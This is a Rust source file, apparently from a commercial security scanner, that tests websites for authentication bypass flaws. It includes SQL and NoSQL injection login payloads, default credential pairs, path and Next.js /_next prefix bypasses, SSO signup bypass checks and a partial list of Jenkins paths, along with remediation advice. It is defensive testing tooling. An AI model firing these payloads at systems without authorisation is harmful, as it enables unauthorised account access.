// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Authentication Bypass Scanner
 * Tests for authentication bypass vulnerabilities
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::info;

pub struct AuthBypassScanner {
    http_client: Arc<HttpClient>,
}

impl AuthBypassScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan for authentication bypass vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[AuthBypass] Scanning: {}", url);

        // Get baseline response for intelligent detection
        if let Ok(response) = self.http_client.get(url).await {
            let characteristics = AppCharacteristics::from_response(&response, url);
            if characteristics.should_skip_auth_tests() {
                info!("[AuthBypass] Skipping - no authentication detected");
                return Ok((Vec::new(), 0));
            }
        }

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Test 1: SQL injection in auth
        tests_run += 1;
        if let Ok(response) = self.test_sql_auth_bypass(url).await {
            self.check_sql_auth_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 2: NoSQL injection in auth
        tests_run += 1;
        if let Ok(response) = self.test_nosql_auth_bypass(url).await {
            self.check_nosql_auth_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 3: Empty password bypass
        tests_run += 1;
        if let Ok(response) = self.test_empty_password(url).await {
            self.check_empty_password_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 4: Default credentials
        tests_run += 1;
        if let Ok(response) = self.test_default_credentials(url).await {
            self.check_default_credentials(&response, url, &mut vulnerabilities);
        }

        // Test 5: Authentication header manipulation
        tests_run += 1;
        if let Ok(response) = self.test_header_manipulation(url).await {
            self.check_header_manipulation(&response, url, &mut vulnerabilities);
        }

        // Test 6: Path traversal to bypass auth
        tests_run += 1;
        if let Ok(response) = self.test_path_bypass(url).await {
            self.check_path_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 7: HTTP verb tampering
        tests_run += 1;
        if let Ok(response) = self.test_verb_tampering(url).await {
            self.check_verb_tampering(&response, url, &mut vulnerabilities);
        }

        // Test 8: Unicode/encoding bypass
        tests_run += 1;
        if let Ok(response) = self.test_encoding_bypass(url).await {
            self.check_encoding_bypass(&response, url, &mut vulnerabilities);
        }

        // Test 9: Next.js middleware bypass via /_next/ prefix
        tests_run += 1;
        let nextjs_results = self.test_nextjs_middleware_bypass(url).await;
        for (bypass_url, response, original_path) in nextjs_results {
            self.check_nextjs_middleware_bypass(
                &response,
                &bypass_url,
                &original_path,
                &mut vulnerabilities,
            );
        }

        // Test 10: SSO redirect bypass - accessing signup page when SSO is forced
        tests_run += 1;
        let sso_bypass_results = self.test_sso_redirect_bypass(url).await;
        vulnerabilities.extend(sso_bypass_results);

        // Test 11: Jenkins anonymous access
        tests_run += 1;
        let jenkins_results = self.test_jenkins_anonymous_access(url).await;
        vulnerabilities.extend(jenkins_results);

        // Test 12: WordPress xmlrpc.php brute force
        tests_run += 1;
        let wordpress_results = self.test_wordpress_xmlrpc(url).await;
        vulnerabilities.extend(wordpress_results);

        // Test 13: Unauthenticated page access (pages accessible without login)
        tests_run += 1;
        let unauth_results = self.test_unauthenticated_page_access(url).await;
        vulnerabilities.extend(unauth_results);

        // Test 14: HTTP DEBUG/TRACE method server version disclosure
        tests_run += 1;
        let debug_method_results = self.test_http_debug_method(url).await;
        vulnerabilities.extend(debug_method_results);

        // Test 15: 403 Bypass - try various techniques to bypass 403 Forbidden
        tests_run += 1;
        let bypass_403_results = self.test_403_bypass(url).await;
        vulnerabilities.extend(bypass_403_results);

        info!(
            "[SUCCESS] [AuthBypass] Completed {} tests, found {} issues",
            tests_run,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Test SQL injection auth bypass
    async fn test_sql_auth_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let payloads = vec![
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'/*",
            "' OR 1=1--",
        ];

        // Try first payload
        let test_url = if url.contains('?') {
            format!(
                "{}&username={}&password={}",
                url,
                urlencoding::encode(payloads[0]),
                urlencoding::encode(payloads[0])
            )
        } else {
            format!(
                "{}?username={}&password={}",
                url,
                urlencoding::encode(payloads[0]),
                urlencoding::encode(payloads[0])
            )
        };

        self.http_client.get(&test_url).await
    }

    /// Check SQL auth bypass
    fn check_sql_auth_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        // Check for successful authentication indicators
        let auth_success = vec![
            "welcome",
            "dashboard",
            "logged in",
            "successful",
            "profile",
            "logout",
            "sign out",
            "authenticated",
        ];

        let success_count = auth_success
            .iter()
            .filter(|&indicator| body_lower.contains(indicator))
            .count();

        if success_count >= 2 || response.status_code == 302 {
            vulnerabilities.push(self.create_vulnerability(
                "SQL Injection Authentication Bypass",
                url,
                Severity::Critical,
                Confidence::High,
                "SQL injection allows authentication bypass - complete account takeover",
                format!(
                    "SQL injection payload bypassed authentication (status: {})",
                    response.status_code
                ),
                9.8,
            ));
        }
    }

    /// Test NoSQL injection auth bypass
    async fn test_nosql_auth_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let payload = r#"{"username": {"$gt": ""}, "password": {"$gt": ""}}"#;

        let test_url = if url.contains('?') {
            format!("{}&data={}", url, urlencoding::encode(payload))
        } else {
            format!("{}?data={}", url, urlencoding::encode(payload))
        };

        self.http_client.get(&test_url).await
    }

    /// Check NoSQL auth bypass
    fn check_nosql_auth_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        if (body_lower.contains("welcome") || body_lower.contains("dashboard"))
            && !body_lower.contains("login")
            && !body_lower.contains("password")
        {
            vulnerabilities.push(self.create_vulnerability(
                "NoSQL Injection Authentication Bypass",
                url,
                Severity::Critical,
                Confidence::Medium,
                "NoSQL injection allows authentication bypass",
                "NoSQL operator injection bypassed authentication".to_string(),
                9.3,
            ));
        }
    }

    /// Test empty password bypass
    async fn test_empty_password(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let test_url = if url.contains('?') {
            format!("{}&username=admin&password=", url)
        } else {
            format!("{}?username=admin&password=", url)
        };

        self.http_client.get(&test_url).await
    }

    /// Check empty password bypass
    fn check_empty_password_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 || response.status_code == 302 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("welcome") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Empty Password Authentication Bypass",
                    url,
                    Severity::Critical,
                    Confidence::Medium,
                    "Authentication accepts empty password - critical security flaw",
                    "Empty password allowed authentication".to_string(),
                    9.1,
                ));
            }
        }
    }

    /// Test default credentials
    async fn test_default_credentials(
        &self,
        url: &str,
    ) -> Result<crate::http_client::HttpResponse> {
        // Common default credentials
        let credentials = vec![
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("administrator", "administrator"),
        ];

        // Try first credential pair
        let (username, password) = credentials[0];
        let test_url = if url.contains('?') {
            format!("{}&username={}&password={}", url, username, password)
        } else {
            format!("{}?username={}&password={}", url, username, password)
        };

        self.http_client.get(&test_url).await
    }

    /// Check default credentials
    fn check_default_credentials(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        if (response.status_code == 200 || response.status_code == 302)
            && (body_lower.contains("welcome") || body_lower.contains("dashboard"))
        {
            vulnerabilities.push(self.create_vulnerability(
                "Default Credentials Accepted",
                url,
                Severity::Critical,
                Confidence::Medium,
                "System accepts default credentials - immediate security risk",
                "Default credentials (admin/admin) may be accepted".to_string(),
                9.0,
            ));
        }
    }

    /// Test header manipulation
    async fn test_header_manipulation(
        &self,
        url: &str,
    ) -> Result<crate::http_client::HttpResponse> {
        // Try adding headers that might bypass auth
        // Note: Simplified version - real implementation would use custom headers
        let test_url = if url.contains('?') {
            format!("{}&X-Forwarded-For=127.0.0.1", url)
        } else {
            format!("{}?X-Forwarded-For=127.0.0.1", url)
        };

        self.http_client.get(&test_url).await
    }

    /// Check header manipulation
    fn check_header_manipulation(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("admin") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Header Manipulation Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Low,
                    "Authentication may be bypassable via header manipulation",
                    "Header manipulation may bypass authentication".to_string(),
                    7.5,
                ));
            }
        }
    }

    /// Test path traversal bypass
    async fn test_path_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        let bypass_paths = vec!["/admin/../admin", "/./admin", "/%2e/admin", "/admin/."];

        // Append first bypass path to URL
        let test_url = format!("{}{}", url, bypass_paths[0]);
        self.http_client.get(&test_url).await
    }

    /// Check path bypass
    fn check_path_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("admin") || body_lower.contains("dashboard") {
                vulnerabilities.push(self.create_vulnerability(
                    "Path Traversal Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Medium,
                    "Path traversal bypasses authentication checks",
                    "Path manipulation bypassed authentication".to_string(),
                    8.1,
                ));
            }
        }
    }

    /// Test HTTP verb tampering
    /// NOTE: This test is DISABLED because it produces false positives.
    /// Simply checking if a page contains words like "admin" or "protected"
    /// is not a valid detection method for verb tampering vulnerabilities.
    ///
    /// A proper verb tampering test would:
    /// 1. Identify endpoints that require authentication and return 401/403 for GET
    /// 2. Test if using HEAD, OPTIONS, or other verbs bypasses that auth check
    /// 3. Compare the actual behavior differences between verbs
    async fn test_verb_tampering(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // Note: Using GET for now - real implementation would test HEAD, OPTIONS, etc.
        self.http_client.get(url).await
    }

    /// Check verb tampering
    /// DISABLED: This check produces too many false positives by looking for
    /// generic words like "admin" or "protected" in page content.
    fn check_verb_tampering(
        &self,
        _response: &crate::http_client::HttpResponse,
        _url: &str,
        _vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        // TODO: Implement proper verb tampering detection:
        // 1. First establish that the endpoint requires auth (returns 401/403 for GET)
        // 2. Then test if other HTTP methods (HEAD, OPTIONS, PUT) bypass auth
        // 3. Report only when there's an actual behavioral difference
        //
        // Current implementation disabled due to false positives on SPAs
        // that contain words like "admin" in their JavaScript bundles.
    }

    /// Test encoding bypass
    async fn test_encoding_bypass(&self, url: &str) -> Result<crate::http_client::HttpResponse> {
        // URL encoding variations
        let encoded_admin = vec![
            "%61dmin",  // URL encoding
            "admin%00", // Null byte
            "admin%20", // Space
        ];

        let test_url = if url.contains('?') {
            format!("{}&username={}", url, encoded_admin[0])
        } else {
            format!("{}?username={}", url, encoded_admin[0])
        };

        self.http_client.get(&test_url).await
    }

    /// Check encoding bypass
    fn check_encoding_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        url: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        if response.status_code == 200 {
            let body_lower = response.body.to_lowercase();

            if body_lower.contains("welcome") || body_lower.contains("authenticated") {
                vulnerabilities.push(self.create_vulnerability(
                    "Encoding-Based Authentication Bypass",
                    url,
                    Severity::High,
                    Confidence::Low,
                    "URL encoding may bypass authentication filters",
                    "Encoding manipulation may bypass authentication".to_string(),
                    7.0,
                ));
            }
        }
    }

    /// Test Next.js middleware bypass via /_next/ prefix
    /// This exploits a known issue where Next.js middleware can be bypassed
    /// by prefixing protected paths with /_next/
    /// Example: /dashboard (protected) -> /_next/dashboard (bypassed)
    /// Example: /kirjaudu (protected) -> /_next/kirjaudu (bypassed)
    async fn test_nextjs_middleware_bypass(
        &self,
        url: &str,
    ) -> Vec<(String, crate::http_client::HttpResponse, String)> {
        let mut results = Vec::new();

        // Parse the URL to extract base and path
        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return results,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
        let current_path = parsed.path();

        // DYNAMIC: Start with the actual path the user provided
        let mut paths_to_test: Vec<String> = Vec::new();

        // Always test the path from the URL first (most important)
        if !current_path.is_empty() && current_path != "/" {
            paths_to_test.push(current_path.to_string());
        }

        // Next.js bypass prefixes - all known bypass vectors
        let bypass_prefixes = vec![
            "/_next",
            "/_next/static",
            "/_next/image",
            "/_next/data",
            "/_next/static/chunks",
            "/_next/static/css",
            "/_next/static/media",
        ];

        // Test the provided path first with all bypass prefixes
        for path in &paths_to_test {
            // First check if original path requires auth
            let original_url = format!("{}{}", base_url, path);

            let original_response = match self.http_client.get(&original_url).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            // If original returns 401/403/302 (protected), try bypass
            let is_protected = original_response.status_code == 401
                || original_response.status_code == 403
                || original_response.status_code == 302
                || original_response.status_code == 307;

            if !is_protected {
                continue;
            }

            // Try all bypass prefixes
            for prefix in &bypass_prefixes {
                let bypass_url = format!("{}{}{}", base_url, prefix, path);

                match self.http_client.get(&bypass_url).await {
                    Ok(response) => {
                        // Bypass successful if we get 200 where we got 401/403/302 before
                        if response.status_code == 200 {
                            results.push((bypass_url, response, path.to_string()));
                            break;
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        // Also discover and test links from the page
        if let Ok(page_response) = self.http_client.get(url).await {
            let discovered_paths = self.extract_paths_from_html(&page_response.body);

            for path in discovered_paths {
                // Skip already tested paths
                if paths_to_test.contains(&path) {
                    continue;
                }

                // Skip static assets
                if path.contains(".js")
                    || path.contains(".css")
                    || path.contains(".png")
                    || path.contains(".jpg")
                    || path.contains(".svg")
                    || path.contains(".ico")
                {
                    continue;
                }

                let original_url = format!("{}{}", base_url, path);

                let original_response = match self.http_client.get(&original_url).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let is_protected = original_response.status_code == 401
                    || original_response.status_code == 403
                    || original_response.status_code == 302
                    || original_response.status_code == 307;

                if !is_protected {
                    continue;
                }

                for prefix in &bypass_prefixes {
                    let bypass_url = format!("{}{}{}", base_url, prefix, path);

                    match self.http_client.get(&bypass_url).await {
                        Ok(response) => {
                            if response.status_code == 200 {
                                results.push((bypass_url, response, path.to_string()));
                                break;
                            }
                        }
                        Err(_) => continue,
                    }
                }
            }
        }

        results
    }

    /// Extract paths from HTML content for dynamic testing
    fn extract_paths_from_html(&self, html: &str) -> Vec<String> {
        let mut paths = Vec::new();

        // Extract href paths
        let href_re = regex::Regex::new(r#"href=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = href_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        // Extract action paths from forms
        let action_re = regex::Regex::new(r#"action=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = action_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        // Extract Next.js Link paths (common in Next.js apps)
        let next_link_re = regex::Regex::new(r#"<Link[^>]*href=["'](/[^"']*?)["']"#).ok();
        if let Some(re) = next_link_re {
            for caps in re.captures_iter(html) {
                if let Some(path) = caps.get(1) {
                    let p = path.as_str().to_string();
                    if !paths.contains(&p) {
                        paths.push(p);
                    }
                }
            }
        }

        paths
    }

    /// Check Next.js middleware bypass results
    fn check_nextjs_middleware_bypass(
        &self,
        response: &crate::http_client::HttpResponse,
        bypass_url: &str,
        original_path: &str,
        vulnerabilities: &mut Vec<Vulnerability>,
    ) {
        let body_lower = response.body.to_lowercase();

        // Look for indicators that we actually got protected content
        let content_indicators = vec![
            "dashboard",
            "admin",
            "profile",
            "settings",
            "account",
            "user",
            "manage",
            "internal",
            "private",
            "panel",
            "api",
            "data",
            "config",
            "json", // API responses
        ];

        let has_protected_content = content_indicators
            .iter()
            .any(|&indicator| body_lower.contains(indicator));

        // Also check for HTML content (not just error pages or blank)
        let has_real_content = body_lower.contains("<html") ||
                               body_lower.contains("<div") ||
                               body_lower.contains("{\"") || // JSON
                               response.body.len() > 500;

        if has_protected_content && has_real_content {
            vulnerabilities.push(Vulnerability {
                id: format!("authbypass_{}", uuid::Uuid::new_v4().to_string()),
                vuln_type: "Authentication Bypass - Next.js Middleware Bypass".to_string(),
                severity: Severity::Critical,
                confidence: Confidence::High,
                category: "Authentication".to_string(),
                url: bypass_url.to_string(),
                parameter: None,
                payload: format!("/_next{}", original_path),
                description: format!(
                    "Next.js middleware bypass detected! The protected path '{}' can be accessed by \
                    prefixing it with '/_next/'. This is a known vulnerability where Next.js middleware \
                    authentication checks can be bypassed, allowing unauthenticated access to protected routes.",
                    original_path
                ),
                evidence: Some(format!(
                    "Original path '{}' was protected, but '{}' returns HTTP 200 with content",
                    original_path, bypass_url
                )),
                cwe: "CWE-287".to_string(), // Improper Authentication
                cvss: 9.1,
                verified: true,
                false_positive: false,
                remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Update Next.js to Latest Version**
   This vulnerability affects certain versions of Next.js middleware.
   Update to the latest patched version immediately.

2. **Add Explicit Path Matching in Middleware**
   ```typescript
   // middleware.ts
   import { NextResponse } from 'next/server';
   import type { NextRequest } from 'next/server';

   export function middleware(request: NextRequest) {
     const pathname = request.nextUrl.pathname;

     // CRITICAL: Check the ACTUAL path, not just pattern matching
     // Normalize the path to prevent /_next/ prefix bypass
     const normalizedPath = pathname.replace(/^\/_next/, '');

     // Define protected paths
     const protectedPaths = ['/admin', '/dashboard', '/api/admin'];

     // Check if accessing protected path (with or without /_next/ prefix)
     const isProtectedPath = protectedPaths.some(path =>
       normalizedPath.startsWith(path) || pathname.startsWith(path)
     );

     if (isProtectedPath) {
       const token = request.cookies.get('auth-token');
       if (!token) {
         return NextResponse.redirect(new URL('/login', request.url));
       }
     }

     return NextResponse.next();
   }

   // IMPORTANT: Configure matcher to include /_next paths
   export const config = {
     matcher: [
       '/((?!_next/static|_next/image|favicon.ico).*)',
       '/admin/:path*',
       '/dashboard/:path*',
       '/_next/admin/:path*',    // Also protect /_next/admin
       '/_next/dashboard/:path*', // Also protect /_next/dashboard
     ],
   };
   ```

3. **Implement Server-Side Authentication Check**
   Don't rely solely on middleware - add server-side checks:
   ```typescript
   // app/admin/page.tsx
   import { redirect } from 'next/navigation';
   import { getServerSession } from 'next-auth';

   export default async function AdminPage() {
     const session = await getServerSession();

     if (!session) {
       redirect('/login');
     }

     // Render protected content
     return <AdminDashboard />;
   }
   ```

4. **Add Route Handler Protection**
   ```typescript
   // app/api/admin/route.ts
   import { NextResponse } from 'next/server';
   import { getServerSession } from 'next-auth';

   export async function GET() {
     const session = await getServerSession();

     if (!session) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
     }

     // Return protected data
   }
   ```

5. **Block /_next Prefix for Protected Paths at CDN/WAF Level**
   In Cloudflare or nginx, block requests that try to access protected
   paths via /_next prefix:
   ```nginx
   location ~* ^/_next/(admin|dashboard|api/admin) {
     return 403;
   }
   ```

References:
- Next.js Security: https://nextjs.org/docs/app/building-your-application/configuring/middleware
- CVE-2024-34351: https://nvd.nist.gov/vuln/detail/CVE-2024-34351
"#.to_string(),
                discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
            });
        }
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        title: &str,
        url: &str,
        severity: Severity,
        confidence: Confidence,
        description: &str,
        evidence: String,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("authbypass_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("Authentication Bypass - {}", title),
            severity,
            confidence,
            category: "Authentication".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: String::new(),
            description: description.to_string(),
            evidence: Some(evidence),
            cwe: "CWE-287".to_string(), // Improper Authentication
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Implement Parameterized Queries (SQL Injection Prevention)**
   ```python
   # WRONG - Vulnerable to SQL injection
   query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

   # CORRECT - Use parameterized queries
   query = "SELECT * FROM users WHERE username=%s AND password=%s"
   cursor.execute(query, (username, hashed_password))
   ```

2. **Use Proper Password Hashing**
   ```javascript
   // Node.js with bcrypt
   const bcrypt = require('bcrypt');

   // Hash password on registration
   const saltRounds = 12;
   const hashedPassword = await bcrypt.hash(password, saltRounds);

   // Verify on login
   const match = await bcrypt.compare(password, storedHash);
   if (!match) {
       throw new Error('Invalid credentials');
   }
   ```

3. **Validate Empty/Null Values**
   ```java
   // Java authentication
   public boolean authenticate(String username, String password) {
       // Reject empty credentials
       if (username == null || username.trim().isEmpty() ||
           password == null || password.trim().isEmpty()) {
           return false;
       }

       // Continue with authentication
       return validateCredentials(username, password);
   }
   ```

4. **Disable Default Credentials**
   ```python
   # Force password change on first login
   if user.is_default_password:
       raise AuthenticationError("Please change default password")

   # Check against common password list
   if password in COMMON_PASSWORDS:
       raise ValidationError("Password too common")
   ```

5. **Implement Proper Header Validation**
   ```javascript
   // Don't trust headers for authentication
   app.use((req, res, next) => {
       // WRONG - Trusting X-Forwarded-For for auth
       if (req.headers['x-forwarded-for'] === '127.0.0.1') {
           req.user = 'admin';  // NEVER DO THIS
       }

       // CORRECT - Only use headers for logging/rate limiting
       const clientIP = req.headers['x-forwarded-for'] || req.ip;
       log.info(`Request from ${clientIP}`);
       next();
   });
   ```

6. **Normalize URLs/Paths**
   ```go
   // Go path normalization
   import "path/filepath"

   func authorizeRequest(requestPath string) bool {
       // Normalize path to prevent traversal
       normalized := filepath.Clean(requestPath)

       // Check if starts with allowed prefix
       if !strings.HasPrefix(normalized, "/api/public/") {
           return requireAuthentication()
       }
       return true
   }
   ```

7. **Restrict HTTP Methods Properly**
   ```javascript
   // Express.js method restriction
   app.route('/admin')
       .get(requireAuth, handleGet)
       .post(requireAuth, handlePost)
       .all((req, res) => {
           // Reject all other methods
           res.status(405).send('Method Not Allowed');
       });
   ```

8. **Sanitize and Validate All Inputs**
   ```python
   import re

   def validate_username(username):
       # Allow only alphanumeric and underscore
       if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
           raise ValidationError("Invalid username format")
       return username

   def authenticate(username, password):
       username = validate_username(username)
       # Continue with authentication
   ```

9. **Implement Rate Limiting**
   ```javascript
   const rateLimit = require('express-rate-limit');

   const authLimiter = rateLimit({
       windowMs: 15 * 60 * 1000,  // 15 minutes
       max: 5,  // 5 attempts
       message: 'Too many login attempts, please try again later',
       standardHeaders: true,
       legacyHeaders: false,
   });

   app.post('/login', authLimiter, handleLogin);
   ```

10. **Use MFA (Multi-Factor Authentication)**
    ```javascript
    async function authenticate(username, password, totpCode) {
        // Verify password
        const user = await verifyPassword(username, password);
        if (!user) return false;

        // Verify TOTP
        const speakeasy = require('speakeasy');
        const verified = speakeasy.totp.verify({
            secret: user.totpSecret,
            encoding: 'base32',
            token: totpCode,
            window: 1
        });

        return verified;
    }
    ```

11. **Security Checklist**
    - [ ] All queries use parameterized statements
    - [ ] Passwords hashed with bcrypt/Argon2
    - [ ] Empty/null credentials rejected
    - [ ] Default credentials disabled/changed
    - [ ] Headers not used for authorization
    - [ ] URL paths normalized
    - [ ] HTTP methods explicitly whitelisted
    - [ ] All inputs validated and sanitized
    - [ ] Rate limiting on auth endpoints (5-10 attempts/15min)
    - [ ] MFA enabled for privileged accounts
    - [ ] Account lockout after failed attempts
    - [ ] Comprehensive logging enabled

12. **Monitoring & Alerting**
    - Log all authentication attempts
    - Alert on multiple failed logins
    - Monitor for SQL injection patterns
    - Track unusual authentication patterns
    - Implement anomaly detection

References:
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- CWE-287: https://cwe.mitre.org/data/definitions/287.html
"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }

    /// Test SSO redirect bypass - check if signup/register pages are accessible when SSO is enforced
    async fn test_sso_redirect_bypass(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));

        // First, check if the main page redirects to SSO
        let main_response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(_) => return vulnerabilities,
        };

        // Check if site forces SSO redirect
        let is_sso_site = main_response.status_code == 302 || main_response.status_code == 307;
        let sso_indicators = vec![
            "sso",
            "saml",
            "oauth",
            "login.microsoftonline",
            "okta",
            "auth0",
            "onelogin",
            "pingidentity",
            "keycloak",
            "adfs",
        ];

        let has_sso_redirect = is_sso_site
            && main_response
                .headers
                .get("location")
                .map(|loc| {
                    sso_indicators
                        .iter()
                        .any(|s| loc.to_lowercase().contains(s))
                })
                .unwrap_or(false);

        if !has_sso_redirect && !main_response.body.to_lowercase().contains("sso") {
            return vulnerabilities;
        }

        // Test signup/register pages that might bypass SSO
        let bypass_paths = vec![
            "/signup",
            "/sign-up",
            "/register",
            "/registration",
            "/create-account",
            "/new-account",
            "/join",
            "/enroll",
            "/subscribe",
            "/rekisteroidy",
            "/rekisteröidy", // Finnish
            "/registrieren",
            "/anmelden", // German
            "/inscription",
            "/inscrire", // French
        ];

        // Test with different methods: GET, POST, different headers
        for path in bypass_paths {
            let test_url = format!("{}{}", base_url, path);

            // Test 1: Direct GET request
            if let Ok(response) = self.http_client.get(&test_url).await {
                if response.status_code == 200 {
                    let body_lower = response.body.to_lowercase();
                    // Check if it's actually a signup form
                    if body_lower.contains("email")
                        && (body_lower.contains("password") || body_lower.contains("register"))
                    {
                        vulnerabilities.push(Vulnerability {
                            id: format!("sso_bypass_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "SSO Redirect Bypass - Signup Page Accessible".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::High,
                            category: "Authentication".to_string(),
                            url: test_url.clone(),
                            parameter: None,
                            payload: path.to_string(),
                            description: format!(
                                "The application enforces SSO login but the signup page at '{}' is directly accessible. \
                                This allows attackers to create local accounts bypassing SSO authentication, \
                                potentially gaining unauthorized access to the application.",
                                path
                            ),
                            evidence: Some(format!(
                                "Main page redirects to SSO but {} returns HTTP 200 with signup form",
                                test_url
                            )),
                            cwe: "CWE-287".to_string(),
                            cvss: 8.1,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Disable local signup when SSO is enforced\n\
                                          2. Remove or protect signup endpoints\n\
                                          3. Configure middleware to block signup routes\n\
                                          4. Implement account provisioning only via SSO/SCIM".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                        break;
                    }
                }
            }

            // Test 2: POST request might bypass redirect
            if let Ok(response) = self.http_client.post(&test_url, String::new()).await {
                if response.status_code == 200 || response.status_code == 422 {
                    let body_lower = response.body.to_lowercase();
                    if body_lower.contains("email")
                        || body_lower.contains("validation")
                        || body_lower.contains("required")
                    {
                        vulnerabilities.push(Vulnerability {
                            id: format!("sso_bypass_post_{}", uuid::Uuid::new_v4().to_string()),
                            vuln_type: "SSO Redirect Bypass - Signup via POST".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::Medium,
                            category: "Authentication".to_string(),
                            url: test_url.clone(),
                            parameter: None,
                            payload: format!("POST {}", path),
                            description: format!(
                                "The signup endpoint '{}' accepts POST requests even though SSO is enforced. \
                                Attackers can potentially create accounts by sending direct POST requests.",
                                path
                            ),
                            evidence: Some("POST request to signup endpoint returns form validation response".to_string()),
                            cwe: "CWE-287".to_string(),
                            cvss: 7.5,
                            verified: true,
                            false_positive: false,
                            remediation: "Block all HTTP methods on signup endpoints when SSO is enforced".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                        });
                        break;
                    }
                }
            }
        }

        vulnerabilities
    }

    /// Test Jenkins anonymous read access
    async fn test_jenkins_anonymous_access(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };

        let base_url = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));

        // Jenkins detection and anonymous access paths
        let jenkins_paths = vec![
            (
                "/api/json",
                "Jenkins API - exposes jobs, builds, and configuration",
            ),
            (
                "/api/json?tree=jobs[name,url,lastBuild[number,result]]",
                "Jenkins jobs listing",
            ),
            ("/api/json?depth=2", "Jenkins deep API - exposes secrets"),
            ("/script", "Jenkins Script Console - RCE if accessible"),
            ("/scriptText", "Jenkins Script API"),
            ("/computer/api/json", "Jenkins nodes/agents info"),
            ("/credentials", "Jenkins credentials page"),
